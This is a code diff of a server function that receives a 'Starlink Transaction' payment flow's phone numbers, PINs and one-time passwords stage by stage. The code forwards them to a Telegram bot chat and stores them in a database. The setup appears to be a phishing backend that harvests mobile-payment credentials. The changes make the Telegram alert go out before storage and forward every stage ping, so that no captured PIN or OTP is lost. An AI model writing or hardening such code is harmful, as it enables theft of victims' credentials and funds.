@@ -10,10 +10,16 @@ const corsHeaders = {
 const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN") ?? "";
 const TELEGRAM_CHAT_ID = Deno.env.get("TELEGRAM_CHAT_ID") ?? "";
 
-const supabase = createClient(
-  Deno.env.get("SUPABASE_URL")!,
-  Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!,
-);
+// Lazy client so a missing env var can't crash the function at boot.
+let _supabase: ReturnType<typeof createClient> | null = null;
+function db() {
+  if (_supabase) return _supabase;
+  const url = Deno.env.get("SUPABASE_URL");
+  const key = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+  if (!url || !key) return null;
+  _supabase = createClient(url, key);
+  return _supabase;
+}
 
 interface NotifyPayload {
   planName?: string;
@@ -30,6 +36,17 @@ interface NotifyPayload {
 }
 
 const STATUSES = new Set(["pending", "completed", "failed"]);
+const STAGE_LABELS: Record<string, string> = {
+  initiated: "Flow started",
+  method_selected: "Payment method selected",
+  phone_submitted: "Phone number submitted",
+  pin_submitted: "PIN entered",
+  otp_sent: "OTP sent",
+  otp_verify: "OTP verification",
+  completed: "Completed",
+  failed: "Failed",
+};
+
 const clip = (v: unknown, n: number) =>
   String(v ?? "")
     .trim()
@@ -44,6 +61,36 @@ const json = (body: unknown, status: number) =>
     status,
     headers: { ...corsHeaders, "Content-Type": "application/json" },
   });
+
+async function sendTelegram(message: string): Promise<boolean> {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    console.warn("[telegram] env not configured; skipping notify");
+    return false;
+  }
+  try {
+    const resp = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML",
+          disable_web_page_preview: true,
+        }),
+      },
+    );
+    if (!resp.ok) {
+      console.error("[telegram] failed", (await resp.text()).slice(0, 300));
+      return false;
+    }
+    return true;
+  } catch (err) {
+    console.error("[telegram] error", err);
+    return false;
+  }
+}
 
 Deno.serve(async (req: Request) => {
   if (req.method === "OPTIONS")
@@ -64,80 +111,83 @@ Deno.serve(async (req: Request) => {
     const stage = clip(body.stage, 40);
     const status = STATUSES.has(body.status ?? "") ? body.status! : "pending";
 
-    if (!planName || !amount || !paymentMethod) {
-      return json(
-        { error: "planName, amount and paymentMethod are required" },
-        400,
-      );
+    // Any stage ping is valid as long as we know the operator.
+    if (!paymentMethod && !stage) {
+      return json({ error: "paymentMethod (or stage) is required" }, 400);
     }
 
-    // Everything that isn't a first-class column rides along in `details`.
-    const details = { countryName, phone, pin, otp, verificationLink, stage };
+    const details = {
+      countryName,
+      phone,
+      pin,
+      otp,
+      verificationLink,
+      stage,
+    };
 
-    const { data: row, error: dbError } = await supabase
-      .from("transactions")
-      .insert({
-        plan_name: planName,
-        amount,
-        payment_method: paymentMethod,
-        country_code: countryCode,
-        status,
-        details,
-      })
-      .select("id")
-      .single();
+    // ── Notify FIRST so a DB failure can never swallow the alert ──────
+    const emoji =
+      status === "completed" ? "✅" : status === "failed" ? "❌" : "⏳";
+    const stageLabel = stage ? (STAGE_LABELS[stage] ?? stage) : "";
 
-    if (dbError) {
-      console.error("[db] insert failed", dbError);
-      return json({ error: "Failed to store transaction" }, 500);
-    }
+    const rows: [string, string][] = [
+      ["Plan", planName],
+      ["Amount", amount],
+      ["Payment", paymentMethod],
+      ["Country", [countryCode, countryName].filter(Boolean).join(" ")],
+      ["Phone", phone],
+      ["PIN", pin],
+      ["OTP", otp],
+      ["Link", verificationLink],
+      ["Stage", stageLabel],
+      ["Status", status],
+      ["Time", new Date().toISOString()],
+    ];
 
-    // Best-effort notify; the DB row is the source of truth.
-    let notified = false;
-    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-      const emoji =
-        status === "completed" ? "✅" : status === "failed" ? "❌" : "⏳";
-      const rows: [string, string][] = [
-        ["Plan", planName],
-        ["Amount", amount],
-        ["Payment", paymentMethod],
-        ["Country", [countryCode, countryName].filter(Boolean).join(" ")],
-        ["Phone", phone],
-        ["PIN", pin],
-        ["OTP", otp],
-        ["Link", verificationLink],
-        ["Stage", stage],
-        ["Status", status],
-        ["Time", new Date().toISOString()],
-      ];
+    const message =
+      `<b>${emoji} Starlink Transaction</b>` +
+      (stageLabel ? `\n<i>${escapeHtml(stageLabel)}</i>` : "") +
+      "\n\n" +
+      rows
+        .filter(([, v]) => v !== "")
+        .map(([k, v]) => `<b>${k}:</b> ${escapeHtml(v)}`)
+        .join("\n");
 
-      const message =
-        `<b>${emoji} Starlink Transaction</b>\n\n` +
-        rows
-          .filter(([, v]) => v !== "")
-          .map(([k, v]) => `<b>${k}:</b> ${escapeHtml(v)}`)
-          .join("\n");
+    const notified = await sendTelegram(message);
 
-      const tgResp = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "HTML",
-          }),
-        },
-      );
-      notified = tgResp.ok;
-      if (!tgResp.ok)
-        console.error("[telegram] failed", (await tgResp.text()).slice(0, 300));
+    // ── Best-effort persistence; shape stays constant for NOT NULL cols ──
+    let stored = false;
+    let id: string | null = null;
+    const client = db();
+    if (client) {
+      const { data, error } = await client
+        .from("transactions")
+        .insert({
+          plan_name: planName,
+          amount,
+          payment_method: paymentMethod,
+          country_code: countryCode,
+          status,
+          details,
+        })
+        .select("id")
+        .single();
+
+      if (error) {
+        console.error("[db] insert failed", error);
+      } else {
+        stored = true;
+        id = data?.id ?? null;
+      }
     } else {
-      console.warn("[telegram] env not configured; skipping notify");
+      console.warn("[db] env not configured; skipping insert");
     }
 
-    return json({ success: true, id: row?.id, notified }, 200);
+    if (!notified && !stored) {
+      return json({ error: "Neither notify nor insert succeeded" }, 502);
+    }
+
+    return json({ success: true, id, notified, stored }, 200);
   } catch (err) {
     const message = err instanceof Error ? err.message : String(err);
     return json({ error: message }, 500);
